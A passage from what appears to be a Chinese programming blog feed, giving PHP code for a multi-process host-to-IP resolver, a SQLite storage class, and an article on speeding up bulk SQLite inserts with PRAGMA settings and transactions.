&#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'(none)'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chk_ip</span><span class="params">($ip)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_NO_PRIV_RANGE) &amp;&amp; substr($ip, <span class="number">0</span>, <span class="number">4</span>) != <span class="string">'127.'</span> &amp;&amp; substr($ip, <span class="number">0</span>, <span class="number">4</span>) != <span class="string">'255.'</span> &amp;&amp; $ip != <span class="string">'0.0.0.0'</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> $ip;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>host2ip.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">date_default_timezone_set(<span class="string">'PRC'</span>);</span><br><span class="line">$start_time = func_time();</span><br><span class="line">is_file($argv[<span class="number">1</span>])?$hostfile=$argv[<span class="number">1</span>]:<span class="keyword">exit</span>(<span class="string">"php $argv[0] host.txt"</span>);</span><br><span class="line">$list=geturllist($hostfile);</span><br><span class="line">$counts=sizeof($list);</span><br><span class="line"></span><br><span class="line">$Refresh=<span class="number">3000000</span>;<span class="comment">//刷新时间3 秒</span></span><br><span class="line">$thread=<span class="number">20</span>; <span class="comment">//并发</span></span><br><span class="line">$ExecTimeout=<span class="number">10</span>;</span><br><span class="line"><span class="comment">//$chunk=array_chunk($list,$thread);//从0 开始</span></span><br><span class="line">printf(<span class="string">"[i] 数量 %d 条,线程数%d ,刷新时间%d微秒,超时时间 %d秒\r\n"</span>,$counts,$thread,$Refresh,$ExecTimeout);</span><br><span class="line">usleep(<span class="number">500000</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"程序执行中...\r\n"</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($list <span class="keyword">as</span> $c )&#123;</span><br><span class="line">$task= task(<span class="string">'resolveip.php'</span>,$ExecTimeout);</span><br><span class="line">back_run(<span class="string">'php.exe resolveip.php '</span>.$c);</span><br><span class="line">  <span class="keyword">if</span>($task &gt;= $thread)&#123;</span><br><span class="line">  usleep($Refresh);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">task</span><span class="params">($taskname,$ExecTimeout)</span></span>&#123;</span><br><span class="line">$LocalWMISvc=<span class="keyword">new</span> com(<span class="string">'WinMgmts:&#123;impersonationLevel=impersonate&#125;!\\\\.\root\CIMV2'</span>);</span><br><span class="line"></span><br><span class="line">$QueryObjSet=$LocalWMISvc-&gt;ExecQuery(<span class="string">"select * from win32_process where commandline like '%&#123;$taskname&#125;%' and (name='php.exe' or name='cmd.exe')"</span>);</span><br><span class="line">$taskcount= $QueryObjSet-&gt;Count;</span><br><span class="line"><span class="keyword">foreach</span> ($QueryObjSet <span class="keyword">as</span> $process)&#123;</span><br><span class="line"><span class="keyword">if</span>((func_time() - strtotime(substr($process-&gt;CreationDate,<span class="number">0</span>,<span class="number">14</span>))) &gt;= $ExecTimeout)&#123;</span><br><span class="line">@exec(<span class="string">"taskkill -pid $process-&gt;ProcessId /f 2&gt;nul"</span>,$o,$r); <span class="comment">//超时则强制退出</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $taskcount;  <span class="comment">//返回进程数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">back_run</span><span class="params">($cmd)</span></span>&#123;</span><br><span class="line">pclose(popen(<span class="string">"start /B "</span>. $cmd , <span class="string">"r"</span>)); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_echo</span><span class="params">($str)</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> $str.PHP_EOL;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func_time</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">list</span>($microsec, $sec) = explode(<span class="string">' '</span>, microtime());</span><br><span class="line">    <span class="keyword">return</span> $sec;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">geturllist</span><span class="params">($hostfile)</span></span>&#123;</span><br><span class="line">$urllist=file($hostfile);</span><br><span class="line"><span class="keyword">if</span>(is_array($urllist))&#123;</span><br><span class="line">$arr=array_unique($urllist);</span><br><span class="line">$url=<span class="string">''</span>;</span><br><span class="line">$urls=<span class="string">''</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $s)&#123;</span><br><span class="line"></span><br><span class="line">$p = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'/(http|https|ftp):\/\//i'</span>,</span><br><span class="line">        <span class="string">'/\//i'</span>,</span><br><span class="line">        <span class="string">'/\s*?/'</span>,</span><br><span class="line">    );</span><br><span class="line">    $url = preg_replace($p, <span class="string">""</span>, $s);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($url))&#123;</span><br><span class="line">    $urls[]=$url;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $urls;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(task(<span class="string">'resolveip.php'</span>,$ExecTimeout) !=<span class="number">0</span>)&#123;</span><br><span class="line">sleep(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'sqlite.php'</span>;</span><br><span class="line">$sql=<span class="keyword">new</span> sqllite();</span><br><span class="line">$c=$sql-&gt;show_count();</span><br><span class="line">$Etime=round((func_time() - $start_time), <span class="number">4</span>);</span><br><span class="line">$fs=($counts-$c);</span><br><span class="line">printf(<span class="string">"共 %d host , 转换成功 %d 条, 失败 %d 条\r\n耗时:%d 秒 \r\n\r\n"</span>,$counts,$c,$fs,$Etime);</span><br><span class="line">$sql-&gt;dump();</span><br><span class="line"><span class="comment">//$sql-&gt;deleteTable();</span></span><br><span class="line">$sql=<span class="keyword">null</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>sqlite.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sqllite</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $ResultFile = <span class="string">'result.txt'</span>;</span><br><span class="line">    <span class="keyword">private</span> $r_db;</span><br><span class="line">    <span class="keyword">private</span> $r_table = <span class="string">'url2ip'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">$this</span>-&gt;r_db = <span class="keyword">new</span> PDO(<span class="string">'sqlite:url2ip.db'</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">array</span>(PDO::ATTR_PERSISTENT =&gt; <span class="keyword">true</span>));</span><br><span class="line">             <span class="comment">//存储结果集</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">//初始化 创建相应的表</span></span><br><span class="line">            $sql = <span class="string">"PRAGMA synchronous = OFF;"</span>;</span><br><span class="line">            $sql.= <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">CREATE TABLE IF NOT EXISTS <span class="subst">&#123;$this-&gt;r_table&#125;</span> (</span></span><br><span class="line"><span class="string">'id'  INTEGER primary key AUTOINCREMENT NOT NULL,</span></span><br><span class="line"><span class="string">'domain'  varchar(50) NOT NULL ,</span></span><br><span class="line"><span class="string">'ip'  varchar(20)  NOT NULL,</span></span><br><span class="line"><span class="string">'server' varchar(100)</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">CREATE UNIQUE INDEX 'unique_<span class="subst">&#123;$this-&gt;r_table&#125;</span>'</span></span><br><span class="line"><span class="string">ON 'url2ip' ('domain' ASC, 'ip' ASC);</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;r_db-&gt;exec($sql);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(PDOException $ex) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"[Error]  "</span> . $ex-&gt;getMessage() . PHP_EOL . <span class="string">'         add/edit in php.ini'</span> . PHP_EOL . <span class="string">'         extension=pdo_sqlite.so or pdo_sqlite.dll'</span> . PHP_EOL);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">($value1, $value2, $value3 = NULL)</span> </span>&#123;</span><br><span class="line">        $db = <span class="keyword">$this</span>-&gt;r_db;</span><br><span class="line">        $sql = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">insert into <span class="subst">&#123;$this-&gt;r_table&#125;</span>('domain','ip','server') VALUES ('<span class="subst">&#123;$value1&#125;</span>', '<span class="subst">&#123;$value2&#125;</span>','<span class="subst">&#123;$value3&#125;</span>') ;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">        $db-&gt;exec($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_result</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $sql = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">SELECT domain,ip,server from <span class="subst">&#123;$this-&gt;r_table&#125;</span>  ORDER BY ip;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">        </span><br><span class="line">        $sql = <span class="keyword">$this</span>-&gt;r_db-&gt;query($sql);</span><br><span class="line">        $result = $sql-&gt;fetchAll();</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_count</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $sql = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">SELECT count(*) from <span class="subst">&#123;$this-&gt;r_table&#125;</span>;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">        </span><br><span class="line">        $result = <span class="keyword">$this</span>-&gt;r_db-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result = $result-&gt;fetch();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> $result[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">deleteTable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $db = <span class="keyword">$this</span>-&gt;r_db;</span><br><span class="line">        $sql = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">drop table if exists <span class="subst">&#123;$this-&gt;r_table&#125;</span>;</span></span><br><span class="line"><span class="string">delete from sqlite_sequence;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">        $db-&gt;exec($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">server_ip_exit</span><span class="params">($ip)</span> </span>&#123;</span><br><span class="line">        $sql = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">SELECT count(*) from <span class="subst">&#123;$this-&gt;r_table&#125;</span> where ip='<span class="subst">&#123;$ip&#125;</span>' and server not NULL;   //该ip server无值</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">        $result = <span class="keyword">$this</span>-&gt;r_db-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result = $result-&gt;fetch();</span><br><span class="line">        <span class="keyword">return</span> $result[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_server</span><span class="params">($ip)</span> </span>&#123;</span><br><span class="line">        $sql = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">select server from <span class="subst">&#123;$this-&gt;r_table&#125;</span> where ip='<span class="subst">&#123;$ip&#125;</span>' and server is not null limit 1;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">        $result = <span class="keyword">$this</span>-&gt;r_db-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result = $result-&gt;fetch();</span><br><span class="line">        <span class="keyword">return</span> $result[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    public function update_server($server,$ip)&#123;</span></span><br><span class="line"><span class="comment">    $db=$this-&gt;r_db;</span></span><br><span class="line"><span class="comment">    $sql =&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="comment">    update &#123;$this-&gt;r_table&#125; set server='&#123;$server&#125;' where ip='&#123;ip&#125;';</span></span><br><span class="line"><span class="comment">    EOF;</span></span><br><span class="line"><span class="comment">    $db-&gt;exec($sql);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">import</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">FALSE</span> !== ($fp = fopen($file, <span class="string">'r'</span>))) &#123;</span><br><span class="line">            $db = <span class="keyword">$this</span>-&gt;r_db;</span><br><span class="line">            $db-&gt;beginTransaction();</span><br><span class="line">            <span class="keyword">while</span> (!feof($fp)) &#123;</span><br><span class="line">                $buffer = trim(fgets($fp, <span class="number">1024</span>));</span><br><span class="line">                <span class="keyword">list</span>($host, $ip, $server) = preg_split(<span class="string">'/\s+/'</span>, $buffer);</span><br><span class="line">                $sql = <span class="string">"insert into &#123;$this-&gt;r_table&#125;('domain','ip','server') VALUES ('&#123;$host&#125;', '&#123;$ip&#125;','$server') ;"</span>;</span><br><span class="line">                $db-&gt;exec($sql);</span><br><span class="line">            &#125;</span><br><span class="line">            $db-&gt;commit();</span><br><span class="line">            fclose($fp);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dump</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $results = <span class="keyword">$this</span>-&gt;show_result();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($results) &amp;&amp; is_array($results)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> ($results <span class="keyword">as</span> $key =&gt; $r) &#123;</span><br><span class="line">                file_put_contents(<span class="keyword">$this</span>-&gt;ResultFile, str_pad($r[<span class="string">'domain'</span>], <span class="number">50</span>, <span class="string">' '</span>) . str_pad($r[<span class="string">'ip'</span>], <span class="number">50</span>, <span class="string">' '</span>) . str_pad($r[<span class="string">'server'</span>], <span class="number">100</span>, <span class="string">' '</span>) . PHP_EOL, FILE_APPEND);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Dump Sussess! SaveTo: '</span> . <span class="keyword">$this</span>-&gt;ResultFile;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"Dump Fail..!  The Result is the empty... \r\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;r_db = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 多进程 php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlite 高速插入文本文件</title>
      <link href="/2015/05/24/sqlite-fast/"/>
      <url>/2015/05/24/sqlite-fast/</url>
      
        <content type="html"><![CDATA[<p>文章首发：<br><a href="https://www.t00ls.net/thread-29905-1-1.html" target="_blank" rel="noopener">t00ls</a><br><a href="http://blog.csdn.net/chenguanzhou123/article/details/9376537" target="_blank" rel="noopener">本文参考文章</a><br>为什么要用<strong>sqlite</strong> ?<br>1、想将数据放进移动存储设备方便随时随地查询<br>2、<strong>sqlite</strong> 跨平台 ，无需服务，仅一个可执行文件即可</p><p>需解决的问题：<br>sqlite 按常规插入数据是非常慢的，不适合插入大数据<br>采用下面的方法后 速度 大大的增加，数G文本 入库都 非常快(相对)</p><p>采用技术：<br>1、关闭写同步(<strong>synchronous</strong>)<br>说明：</p><p>简要说来，full写入速度最慢，但保证数据是安全的，不受断电、系统崩溃等影响，而off可以加速数据库的一些操作，但如果系统崩溃或断电，则数据库可能会损毁。<br>SQLite3中，该选项的默认值就是full，如果我们再插入数据前将其改为off，则会提高效率。如果仅仅将SQLite当做一种临时数据库的话，完全没必要设置为full</p><p>2、执行准备 <strong>prepare</strong></p><p>说明：</p><p>SQLite执行SQL语句的时候，有两种方式：一种是使用前文提到的函数sqlite3_exec()，该函数直接调用包含SQL语句的字符串；另一种方法就是“执行准备”（类似于存储过程）操作，即先将SQL语句编译好，然后再一步一步（或一行一行）地执行。如果采用前者的话，就算开起了事务，SQLite仍然要对循环中每一句SQL语句进行“词法分析”和“语法分析”，这对于同时插入大量数据的操作来说，简直就是浪费时间。因此，要进一步提高插入效率的话，就应该使用后者。</p><p>3、显式开启事务 <strong>BEGIN…COMMIT</strong><br>说明：</p><p>SQLite的数据库本质上来讲就是一个磁盘上的文件，所以一切的数据库操作其实都会转化为对文件的操作，而频繁的文件操作将会是一个很好时的过程，会极大地影响数据库存取的速度。<br>        采用该种方法 就是将全部要执行的SQL语句先缓存在内存当中，然后等到COMMIT的时候一次性的写入数据库，这样数据库文件只被打开关闭了一次，效率自然大大的提高。<br>4、查询的话普通索引依旧很慢 我们可以采用fulltext 索引 速度比mysql快</p><p>下面我们将1千万数据插入sqlite 看看消耗多少时间<br><code>php test.php</code><br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/buhuo.png" alt></p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$t1 = microtime(<span class="keyword">true</span>);</span><br><span class="line">ini_set(<span class="string">"memory_limit"</span>,<span class="string">'-1'</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sqllite</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $r_db;</span><br><span class="line">    <span class="keyword">private</span> $r_table=<span class="string">'test'</span>;   </span><br><span class="line">       </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;r_db=<span class="keyword">new</span> PDO(<span class="string">'sqlite:test.db3'</span>);</span><br><span class="line">$sql =<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">PRAGMA temp_store = memory;</span></span><br><span class="line"><span class="string">PRAGMA locking_mode = EXCLUSIVE;</span></span><br><span class="line"><span class="string">PRAGMA synchronous = OFF;</span></span><br><span class="line"><span class="string">PRAGMA cache_size = 400000;</span></span><br><span class="line"><span class="string">PRAGMA page_size = 4096;</span></span><br><span class="line"><span class="string">PRAGMA auto_vacuum=NONE;</span></span><br><span class="line"><span class="string">PRAGMA count_changes = OFF;</span></span><br><span class="line"><span class="string">PRAGMA journal_mode = OFF;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">CREATE TABLE IF NOT EXISTS <span class="subst">&#123;$this-&gt;r_table&#125;</span> (</span></span><br><span class="line"><span class="string">        'id'  INTEGER primary key AUTOINCREMENT NOT NULL,</span></span><br><span class="line"><span class="string">        'test' char(15) NOT NULL</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"><span class="comment">//exit($sql.PHP_EOL);</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;r_db-&gt;exec($sql);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (PDOException $ex)&#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">"[Error]  "</span>.$ex-&gt;getMessage() .PHP_EOL.</span><br><span class="line">        <span class="string">'         sudo apt-get install php5-sqlite php5-pdo'</span>.PHP_EOL.</span><br><span class="line">        <span class="string">'         add/edit in php.ini'</span>.PHP_EOL.</span><br><span class="line">        <span class="string">'         extension=pdo.so or pdo_sqlite.dll'</span>.PHP_EOL</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_count</span><span class="params">()</span></span>&#123;</span><br><span class="line">$sql =<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">SELECT count(id) from <span class="subst">&#123;$this-&gt;r_table&#125;</span>;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"></span><br><span 